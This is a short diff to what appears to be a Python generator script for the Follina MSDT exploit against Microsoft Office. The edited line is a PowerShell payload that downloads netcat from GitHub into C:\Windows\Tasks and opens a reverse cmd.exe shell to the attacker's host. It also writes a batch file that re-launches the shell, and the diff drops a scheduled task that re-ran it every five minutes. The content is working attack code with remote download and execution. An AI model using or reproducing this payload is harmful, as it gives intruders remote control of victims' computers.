@@ -108,7 +108,7 @@ def main(args):
 
     command = args.command
     if args.reverse:
-        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse} && echo @echo off > scriptfollina.bat & echo nc.exe -e cmd.exe {serve_host} {args.reverse} >> scriptfollina.bat & echo pause >> scriptfollina.bat && schtasks /create /tn tfollina /tr C:\\Windows\\Tasks\\scriptfollina.bat /sc minute /mo 5"""
+        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse} && echo @echo off > scriptfollina.bat & echo nc.exe -e cmd.exe {serve_host} {args.reverse} >> scriptfollina.bat & echo pause >> scriptfollina.bat"""
 
     # Base64 encode our command so whitespace is respected
     base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
